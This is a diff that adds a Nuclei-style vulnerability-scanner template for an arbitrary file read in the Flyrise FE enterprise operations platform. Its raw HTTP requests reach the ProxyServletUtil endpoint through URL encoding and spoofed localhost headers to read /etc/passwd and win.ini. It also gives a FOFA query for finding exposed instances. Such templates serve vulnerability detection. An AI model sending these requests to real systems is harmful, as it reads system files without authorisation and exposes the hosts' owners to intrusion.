@@ -1,0 +1,44 @@
+id: flyrise-proxyservletutil-fileread
+info:
+  name: 飞企互联 FE 企业运营管理平台 ProxyServletUti - fileread
+  author: leadlife
+  severity: high
+  description: 飞企互联-FE企业运营管理平台 proxyservletutil 任意文件读取漏洞
+  metadata:
+    verified: true
+    fofa-qeury: app="飞企互联-FE企业运营管理平台"
+  tags: flyrise,fileread
+
+
+http:
+  - raw:
+      - |+
+        GET /ProxyServletUti%6c?url=file:///c:/windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+
+      - |+
+        GET /ProxyServletUti%6c?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          
